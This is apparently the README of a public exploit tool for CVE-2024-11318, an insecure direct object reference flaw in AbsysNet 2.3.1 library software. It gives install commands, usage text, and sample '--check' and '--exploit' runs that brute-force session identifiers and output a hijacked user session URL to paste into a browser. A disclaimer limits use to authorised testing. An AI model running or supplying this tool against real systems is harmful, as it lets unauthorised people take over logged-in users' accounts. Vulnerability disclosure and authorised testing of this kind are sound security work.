# CVE-2024-11318 (IDOR - AbsysNet 2.3.1 User Hijacking)
---
# DISCLAIMER

This tool is designed to help identify and exploit whether an application is vulnerable to this specific CVE-2024-11318. It is intended for use by cybersecurity professionals, researchers, and penetration testers to assess security in environments where they have explicit authorization.

If the vulnerability is confirmed, exploitation should only occur if you have proper authorization from the application or system owner.

***Unauthorized use of this tool against systems or networks you do not own or have explicit permission to test is illegal and unethical. The author takes no responsibility for misuse or damage caused by this tool.***

By using this tool, you agree to comply with all relevant laws and ethical standards. Always ensure you have explicit permission before conducting tests or exploiting vulnerabilities.

---
## DESCRIPTION

This vulnerability affects AbsysNet version 2.3.1 and allows a remote attacker to compromise an active user's session. The attack involves exploiting an IDOR (Insecure Direct Object Reference) vulnerability in the /cgi-bin/ocap/ endpoint, where the session identifier is susceptible to brute-forcing. 

Upon successfully matching a session ID associated with an authenticated user, the authentication token is exposed in the HTML code. However, the attack is limited to active sessions, and if the affected user logs out, the attacker’s access is immediately terminated, restricting the persistence of the compromise.

With this vulerability is only posible to hijack user sessions that are currenltly logged in and if the current user loggeds off the attacker loses the conection. 

---

## INSTALL

```sh
git clone https://github.com/xthalach/CVE-2024-11318.git
cd CVE-2024-11318
python3 -m venv cve-2024-11318
source cve-2024-11318/bin/activate
pip install -r requirements.txt
python3 cve-2024-11318.py
```

---

## USAGE
```text
python3 cve-2024-11318.py 

                                                                                                                                                                      
    ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗       ██╗ ██╗██████╗  ██╗ █████╗ 
    ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ███║███║╚════██╗███║██╔══██╗
    ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗╚██║╚██║ █████╔╝╚██║╚█████╔╝
    ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝ ██║ ██║ ╚═══██╗ ██║██╔══██╗
    ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║       ██║ ██║██████╔╝ ██║╚█████╔╝
    ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝       ╚═╝ ╚═╝╚═════╝  ╚═╝ ╚════╝ 

    ᴀᴜᴛʜᴏʀ﹕xᴛʜᴀʟᴀᴄʜ ʜᴛᴛᴘs﹕//xᴛʜᴀʟᴀᴄʜ.ɢɪᴛʜᴜʙ.ɪᴏ/
    ɪɴsᴛᴀɢʀᴀᴍ﹕ ﹫xᴛʜᴀʟᴀᴄʜ.ᴛᴡɪᴛᴄʜ
    ᴛᴡɪᴛᴛᴇʀ﹕ ﹫xᴛʜᴀʟᴀᴄʜ
    
usage: CVE-2024-11318.py [-h] -u URL [--check] [--exploit]

This script allows you to assess whether a website is vulnerable to CVE-2024-11318. If confirmed, it provides the option to exploit the vulnerability, but only under circumstances where you have explicit authorization to do so.

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Target URL
  --check            This option in this script allows you to test whether a website is vulnerable to the CVE-2024-11318.
  --exploit          This option in this script enables you to exploit the CVE-2024-11318 vulnerability.

```

## --CHECK

- Vulnerable 
```text
└─$ python3 CVE-2024-11318.py -u 'https://www.contoso.com/cgi-bin/opac/O7375/ID009a7a6e?ACC=101' --check
                                                                                                                                                                      
    ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗       ██╗ ██╗██████╗  ██╗ █████╗ 
    ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ███║███║╚════██╗███║██╔══██╗
    ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗╚██║╚██║ █████╔╝╚██║╚█████╔╝
    ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝ ██║ ██║ ╚═══██╗ ██║██╔══██╗
    ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║       ██║ ██║██████╔╝ ██║╚█████╔╝
    ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝       ╚═╝ ╚═╝╚═════╝  ╚═╝ ╚════╝ 

    ᴀᴜᴛʜᴏʀ﹕xᴛʜᴀʟᴀᴄʜ ʜᴛᴛᴘs﹕//xᴛʜᴀʟᴀᴄʜ.ɢɪᴛʜᴜʙ.ɪᴏ/
    ɪɴsᴛᴀɢʀᴀᴍ﹕ ﹫xᴛʜᴀʟᴀᴄʜ.ᴛᴡɪᴛᴄʜ
    ᴛᴡɪᴛᴛᴇʀ﹕ ﹫xᴛʜᴀʟᴀᴄʜ
    
[|] STARTING ATTACK: CHECKING IF THE TARGET IT'S VULNERABLE!
[*] CHECKING URL: https://www.contoso.com/cgi-bin/opac/O7375/?ACC=101
[+] VULNERABLE: The token 'ID009a7a6e' has been found in the html code.

```

- Not Vulnerable
```text
└─$ python3 CVE-2024-11318.py -u 'https://contoso.com/cgi-bin/abnetopac/O7fbxZNd3yjeqX7isbLYjGeEUqX?ACC=101' --check
                                                                                                                                                                      
    ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗       ██╗ ██╗██████╗  ██╗ █████╗ 
    ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ███║███║╚════██╗███║██╔══██╗
    ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗╚██║╚██║ █████╔╝╚██║╚█████╔╝
    ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝ ██║ ██║ ╚═══██╗ ██║██╔══██╗
    ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║       ██║ ██║██████╔╝ ██║╚█████╔╝
    ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝       ╚═╝ ╚═╝╚═════╝  ╚═╝ ╚════╝ 

    ᴀᴜᴛʜᴏʀ﹕xᴛʜᴀʟᴀᴄʜ ʜᴛᴛᴘs﹕//xᴛʜᴀʟᴀᴄʜ.ɢɪᴛʜᴜʙ.ɪᴏ/
    ɪɴsᴛᴀɢʀᴀᴍ﹕ ﹫xᴛʜᴀʟᴀᴄʜ.ᴛᴡɪᴛᴄʜ
    ᴛᴡɪᴛᴛᴇʀ﹕ ﹫xᴛʜᴀʟᴀᴄʜ
    
[q] STARTING ATTACK: CHECKING IF THE TARGET IT'S VULNERABLE!
[←] CHECKING URL: https://contoso.com/cgi-bin/abnetopac/O7fbxZNd3yjeqX7isbLYjGeEUqX?ACC=101
[-] NOT VULNERABLE: The aplication has been pached, token value "O7fbxZNd3yjeqX7isbLYjGeEUqX" not match.

```

## --EXPLOIT

```text
└─$ python3 CVE-2024-11318.py -u 'https://www.contoso.com/cgi-bin/opac/O7067/ID5c22d860?ACC=101' --exploit
                                                                                                                                                                      
    ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗       ██╗ ██╗██████╗  ██╗ █████╗ 
    ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ███║███║╚════██╗███║██╔══██╗
    ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗╚██║╚██║ █████╔╝╚██║╚█████╔╝
    ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝ ██║ ██║ ╚═══██╗ ██║██╔══██╗
    ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║       ██║ ██║██████╔╝ ██║╚█████╔╝
    ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝       ╚═╝ ╚═╝╚═════╝  ╚═╝ ╚════╝ 

    ᴀᴜᴛʜᴏʀ﹕xᴛʜᴀʟᴀᴄʜ ʜᴛᴛᴘs﹕//xᴛʜᴀʟᴀᴄʜ.ɢɪᴛʜᴜʙ.ɪᴏ/
    ɪɴsᴛᴀɢʀᴀᴍ﹕ ﹫xᴛʜᴀʟᴀᴄʜ.ᴛᴡɪᴛᴄʜ
    ᴛᴡɪᴛᴛᴇʀ﹕ ﹫xᴛʜᴀʟᴀᴄʜ
    
[█] STARTING ATTACK: EXPLOITING THE TARGET!
[*] --- STARTING EXPLOIT ---
[b] URL: https://www.contoso.com/cgi-bin/opac/O7099/?ACC=101
[+] User Token Hijacking: https://www.contoso.com/cgi-bin/opac/O7054/ID9f842d80?ACC=101 (COPY & PASTE INTO BROWSER)

```




